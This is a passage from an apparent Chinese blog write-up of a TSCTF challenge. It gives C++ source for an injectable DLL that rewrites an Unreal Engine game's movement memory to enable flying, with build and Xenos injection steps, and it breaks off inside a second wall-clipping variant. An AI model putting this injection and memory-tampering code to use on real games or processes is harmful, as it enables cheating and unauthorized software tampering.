class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;atomic&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;BasicType.h&quot;</span>   <span class="comment">// UEDumper 导出的基础类型，提供 TArray 等模板</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 简易前向声明 -----------------------------------------------------------</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UWorld</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UGameInstance</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ULocalPlayer</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">APlayerController</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">APawn</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ACharacter</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UCharacterMovementComponent</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">FVector</span> &#123; <span class="type">float</span> X, Y, Z; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 之前我们发现的状态</span></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">EMovementMode</span> : <span class="type">uint8_t</span> &#123;</span><br><span class="line">    MOVE_None = <span class="number">0</span>,</span><br><span class="line">    MOVE_Walking = <span class="number">1</span>,</span><br><span class="line">    MOVE_NavWalking,</span><br><span class="line">    MOVE_Falling,</span><br><span class="line">    MOVE_Swimming,</span><br><span class="line">    MOVE_Flying,</span><br><span class="line">    MOVE_Custom</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 偏移常量（来自 merged_AudioMixer_Engine_UMG_MovieScene_MovieSceneTracks.h） ---</span></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">uintptr_t</span> OFFSET_GWORLD = <span class="number">0x49EE370</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UWORLD_OWNING_GI = <span class="number">0x180</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UGAMEINSTANCE_LOCALPLAYERS = <span class="number">0x38</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_ULOCALPLAYER_PLAYERCONTROLLER = <span class="number">0x30</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_APLAYERCONTROLLER_ACKPAWN = <span class="number">0x2A0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_ACHARACTER_CHARACTERMOVEMENT = <span class="number">0x288</span>;          <span class="comment">// 角色移动</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_MOVEMENTMODE = <span class="number">0x168</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_DEFAULTLANDMODE = <span class="number">0x384</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_PENDINGLAUNCHVELOC = <span class="number">0x3C0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_LASTUPDATEVELOC = <span class="number">0x25C</span>; <span class="comment">// LastUpdateVelocity</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 全局状态 ---------------------------------------------------------------</span></span><br><span class="line"><span class="type">static</span> std::atomic&lt;<span class="type">bool</span>&gt; g_running&#123; <span class="literal">true</span> &#125;;</span><br><span class="line"><span class="type">static</span> std::atomic&lt;<span class="type">bool</span>&gt; g_flyEnabled&#123; <span class="literal">false</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 便捷访问函数 -----------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">uintptr_t</span> <span class="title">GetModuleBase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">uintptr_t</span> base = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uintptr_t</span>&gt;(::<span class="built_in">GetModuleHandleW</span>(<span class="literal">nullptr</span>));</span><br><span class="line">    <span class="keyword">return</span> base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据偏移找GWorld</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UWorld* <span class="title">GetWorld</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UWorld**&gt;(<span class="built_in">GetModuleBase</span>() + OFFSET_GWORLD);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取实例，拿本地玩家列表，我们要拿[0]</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UGameInstance* <span class="title">GetGameInstance</span><span class="params">(UWorld* world)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!world) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UGameInstance**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(world) + OFFSET_UWORLD_OWNING_GI);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> TArray&lt;ULocalPlayer*&gt;&amp; <span class="title">GetLocalPlayers</span><span class="params">(UGameInstance* gi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">reinterpret_cast</span>&lt;TArray&lt;ULocalPlayer*&gt;*&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(gi) + OFFSET_UGAMEINSTANCE_LOCALPLAYERS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> APlayerController* <span class="title">GetPlayerController</span><span class="params">(ULocalPlayer* lp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;APlayerController**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(lp) + OFFSET_ULOCALPLAYER_PLAYERCONTROLLER);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这一帧实际被控制的 Pawn，拿到这个指针就能访问 ACharacter</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> ACharacter* <span class="title">GetAcknowledgedCharacter</span><span class="params">(APlayerController* pc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;ACharacter**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(pc) + OFFSET_APLAYERCONTROLLER_ACKPAWN);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UCharacterMovementComponent* <span class="title">GetCharacterMovement</span><span class="params">(ACharacter* character)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UCharacterMovementComponent**&gt;(</span><br><span class="line">        <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(character) + OFFSET_ACHARACTER_CHARACTERMOVEMENT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 写飞行相关字段 ---------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ApplyFlyState</span><span class="params">(UCharacterMovementComponent* movement, <span class="type">bool</span> enable)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!movement) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>* base = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(movement);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span>&amp; movementMode = *<span class="built_in">reinterpret_cast</span>&lt;EMovementMode*&gt;(base + OFFSET_UCHARMOVEMENT_MOVEMENTMODE);</span><br><span class="line">    <span class="keyword">auto</span>&amp; defaultLandMode = *<span class="built_in">reinterpret_cast</span>&lt;EMovementMode*&gt;(base + OFFSET_UCHARMOVEMENT_DEFAULTLANDMODE);</span><br><span class="line">    <span class="keyword">auto</span>&amp; pendingLaunchVelocity = *<span class="built_in">reinterpret_cast</span>&lt;FVector*&gt;(base + OFFSET_UCHARMOVEMENT_PENDINGLAUNCHVELOC);</span><br><span class="line">    <span class="keyword">auto</span>&amp; lastUpdateVelocity = *<span class="built_in">reinterpret_cast</span>&lt;FVector*&gt;(base + OFFSET_UCHARMOVEMENT_LASTUPDATEVELOC);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (enable) &#123;</span><br><span class="line">        movementMode = EMovementMode::MOVE_Flying;</span><br><span class="line">        defaultLandMode = EMovementMode::MOVE_Flying;</span><br><span class="line">        pendingLaunchVelocity = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">800.f</span> &#125;;</span><br><span class="line">        lastUpdateVelocity = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">600.f</span> &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        movementMode = EMovementMode::MOVE_Walking;</span><br><span class="line">        defaultLandMode = EMovementMode::MOVE_Walking;</span><br><span class="line">        pendingLaunchVelocity = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">0.f</span> &#125;;</span><br><span class="line">        lastUpdateVelocity = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">0.f</span> &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 持续维持飞行状态，防止游戏自动还原</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SustainFly</span><span class="params">(UCharacterMovementComponent* movement)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!movement) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>* base = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(movement);</span><br><span class="line">    <span class="keyword">auto</span>&amp; movementMode = *<span class="built_in">reinterpret_cast</span>&lt;EMovementMode*&gt;(base + OFFSET_UCHARMOVEMENT_MOVEMENTMODE);</span><br><span class="line">    <span class="keyword">auto</span>&amp; lastUpdateVelocity = *<span class="built_in">reinterpret_cast</span>&lt;FVector*&gt;(base + OFFSET_UCHARMOVEMENT_LASTUPDATEVELOC);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// movementMode 本质是 *(EMovementMode*)(base + 0x168) 的别名,base 指向 UCharacterMovementComponent 的起始地址. base + OFFSET_UCHARMOVEMENT_MOVEMENTMODE 跳到 MovementMode 字段； reinterpret_cast&lt;EMovementMode*&gt; 把那块内存视为 EMovementMode * ；</span></span><br><span class="line">    <span class="comment">// 通过引用赋值 movementMode = EMovementMode::MOVE_Flying; 就是把那 1 字节的内存直接写成飞行枚举。</span></span><br><span class="line">    movementMode = EMovementMode::MOVE_Flying;</span><br><span class="line">    <span class="keyword">if</span> (lastUpdateVelocity.Z &lt; <span class="number">300.f</span>) &#123;</span><br><span class="line">        lastUpdateVelocity.Z = <span class="number">400.f</span>; <span class="comment">// 给一点上升速度</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 热键线程 ---------------------------------------------------------------</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">FlyThread</span><span class="params">(LPVOID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (g_running) &#123;</span><br><span class="line">        <span class="keyword">if</span> (::<span class="built_in">GetAsyncKeyState</span>(VK_F6) &amp; <span class="number">1</span>) &#123;</span><br><span class="line">            UWorld* world = <span class="built_in">GetWorld</span>();</span><br><span class="line">            <span class="keyword">auto</span> gi = <span class="built_in">GetGameInstance</span>(world);</span><br><span class="line">            <span class="keyword">if</span> (!gi) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span>&amp; players = <span class="built_in">GetLocalPlayers</span>(gi);</span><br><span class="line">            <span class="keyword">if</span> (!players.<span class="built_in">IsValidIndex</span>(<span class="number">0</span>) || !players[<span class="number">0</span>]) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> pc = <span class="built_in">GetPlayerController</span>(players[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">if</span> (!pc) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> character = <span class="built_in">GetAcknowledgedCharacter</span>(pc);</span><br><span class="line">            <span class="keyword">auto</span> movement = <span class="built_in">GetCharacterMovement</span>(character);</span><br><span class="line">            g_flyEnabled = !g_flyEnabled.<span class="built_in">load</span>();</span><br><span class="line">            <span class="built_in">ApplyFlyState</span>(movement, g_flyEnabled);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            玩家切关、死亡重生、切换 Pawn 时，GWorld、GameInstance、LocalPlayers 乃至 AcknowledgedPawn 都可能变；如果只在按热键那一刻取一次指针，等角色重建后就指向旧对象，易崩溃或写不到新角色。</span></span><br><span class="line"><span class="comment">            循环里每次重新取 GWorld→GameInstance→LocalPlayer→PlayerController→Pawn→Movement，能在状态变化时自动跟上，确保对当前角色生效，也避免解引用野指针。</span></span><br><span class="line"><span class="comment">            用 TArray::IsValidIndex 防御空指针，配合持续刷新 MovementMode 就能稳定维持飞行。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (g_flyEnabled) &#123;</span><br><span class="line">            UWorld* world = <span class="built_in">GetWorld</span>();</span><br><span class="line">            <span class="keyword">auto</span> gi = <span class="built_in">GetGameInstance</span>(world);</span><br><span class="line">            <span class="keyword">if</span> (gi) &#123;</span><br><span class="line">                <span class="keyword">auto</span>&amp; players = <span class="built_in">GetLocalPlayers</span>(gi);</span><br><span class="line">                <span class="keyword">if</span> (players.<span class="built_in">IsValidIndex</span>(<span class="number">0</span>) &amp;&amp; players[<span class="number">0</span>]) &#123;</span><br><span class="line">                    <span class="keyword">auto</span> pc = <span class="built_in">GetPlayerController</span>(players[<span class="number">0</span>]);</span><br><span class="line">                    <span class="keyword">if</span> (pc) &#123;</span><br><span class="line">                        <span class="keyword">auto</span> character = <span class="built_in">GetAcknowledgedCharacter</span>(pc);</span><br><span class="line">                        <span class="keyword">auto</span> movement = <span class="built_in">GetCharacterMovement</span>(character);</span><br><span class="line">                        <span class="built_in">SustainFly</span>(movement);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        std::this_thread::<span class="built_in">sleep_for</span>(std::chrono::<span class="built_in">milliseconds</span>(<span class="number">20</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE <span class="keyword">module</span>, DWORD reason, LPVOID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (reason == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line">        ::<span class="built_in">DisableThreadLibraryCalls</span>(<span class="keyword">module</span>);</span><br><span class="line"></span><br><span class="line">        ::<span class="built_in">MessageBoxW</span>(<span class="literal">nullptr</span>,</span><br><span class="line">            <span class="string">L&quot;TSCTF DLL 注入成功\nF6 切换飞行模式&quot;</span>,</span><br><span class="line">            <span class="string">L&quot;TSCTF Helper&quot;</span>,</span><br><span class="line">            MB_OK | MB_ICONINFORMATION);</span><br><span class="line"></span><br><span class="line">        ::<span class="built_in">CreateThread</span>(<span class="literal">nullptr</span>, <span class="number">0</span>, FlyThread, <span class="literal">nullptr</span>, <span class="number">0</span>, <span class="literal">nullptr</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (reason == DLL_PROCESS_DETACH) &#123;</span><br><span class="line">        g_running = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>visual studio新建dll项目</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014221722121.png" alt="image-20251014221722121"></p><p>注意引如BasicType.h</p><p>然后生成项目</p><p>relase x64</p><p>然后找工具注入</p><p>如：</p><p><a href="https://github.com/DarthTon/Xenos">DarthTon&#x2F;Xenos: Windows dll injector</a></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014211218244.png" alt="image-20251014211218244"></p><p>注入即可</p><p>按F6起飞</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014211202488.png"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014211105377.png" alt="image-20251014211105377"></p><p>这里再添加一个脚本兼容穿墙和起飞</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014222324466.png" alt="image-20251014222324466"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014223118044.png" alt="image-20251014223115885"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;atomic&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;BasicType.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UWorld</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UGameInstance</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ULocalPlayer</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">APlayerController</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">APawn</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ACharacter</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UCharacterMovementComponent</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UCapsuleComponent</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">FVector</span> &#123; <span class="type">float</span> X, Y, Z; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">EMovementMode</span> : <span class="type">uint8_t</span> &#123;</span><br><span class="line">    MOVE_None = <span 